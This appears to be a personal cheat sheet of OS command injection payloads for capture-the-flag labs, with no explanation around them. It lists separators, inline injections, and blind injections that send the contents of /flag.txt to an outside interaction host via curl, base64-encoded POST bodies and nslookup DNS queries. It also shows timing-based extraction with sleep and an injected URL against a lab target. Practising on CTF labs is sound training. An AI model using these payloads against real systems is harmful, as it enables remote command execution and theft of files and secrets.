___

```
;
&&
|
$(command)
```

# Inline

```
`curl https://puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun/$(id)`
```

```
`cat /flag.txt > flag.txt`
```

# Blind

```
https://ey8u7q46.eu1.ctfio.com/stock-check.php?id=f3d1426d-16af-4243-a148-d7c874ddfe1a;curl https://puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun/$(cat /flag.txt | base64)
```

```bash
;curl -X POST -d $(base64 /flag.txt) https://puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun
```

# Blind Over DNS

```
;nslookup $(cat /flag.txt).puuatcmlkisigmqtcmzz2h8t9h4o08jgb.oast.fun
```

# Blind (No Network)

```
; if [ $(cat /flag.txt | cut -c 1-1) = "f" ]; then sleep 3; fi
```

```
; if [ $(cat /flag.txt | cut -c 1-6) = "flag{7" ]; then sleep 3; fi
```

![[Pasted image 20241215201548.png]]

# File Uploads


